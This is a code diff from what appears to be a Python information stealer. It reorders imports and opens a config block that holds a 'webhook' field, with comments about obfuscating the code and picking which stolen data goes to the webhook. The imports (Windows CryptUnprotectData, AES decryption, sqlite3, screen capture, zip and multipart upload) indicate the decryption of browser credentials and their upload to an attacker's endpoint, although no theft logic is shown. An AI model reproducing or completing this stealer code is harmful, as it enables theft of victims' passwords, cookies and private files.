@@ -1,27 +1,28 @@
 #imports - when you are obfuscating your code you must leave imports untouched
-import base64
-import concurrent.futures
-import ctypes
-import json
+import sys
 import os
+import base64
+import ctypes
+import requests
+import psutil
+import json
 import random
 import re
 import sqlite3
 import subprocess
-import sys
 import threading
 import time
-from ctypes import wintypes
-from multiprocessing import cpu_count
 from shutil import copy2
-from zipfile import ZIP_DEFLATED, ZipFile
-import psutil
-import requests
-from Cryptodome.Cipher import AES
+import concurrent.futures
+from ctypes import wintypes
 from PIL import Image, ImageGrab
-from requests_toolbelt.multipart.encoder import MultipartEncoder
+from Cryptodome.Cipher import AES
+from multiprocessing import cpu_count
+from zipfile import ZIP_DEFLATED, ZipFile
 from win32crypt import CryptUnprotectData
-#config -you can setup only features that interesting you to not have a mess at your webhook
+from requests_toolbelt.multipart.encoder import MultipartEncoder
+
+
 __CONFIG__ = {
     "webhook": "YOUR WEBHOOK HERE",
     "ping": True,
